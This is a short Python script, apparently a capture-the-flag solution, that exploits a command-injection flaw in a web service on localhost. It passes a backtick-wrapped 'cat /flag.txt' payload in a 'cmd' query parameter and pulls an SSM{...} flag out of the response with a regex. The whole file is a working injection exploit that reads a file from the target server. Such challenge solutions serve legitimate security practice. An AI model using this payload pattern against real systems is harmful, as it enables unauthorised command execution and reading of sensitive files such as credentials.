import re
import requests

r = requests.get("http://127.0.0.1:8009/?cmd=echo%20`cat%20/flag.txt`;")

print(re.search(r"SSM\{.+\}", r.text).group(0))
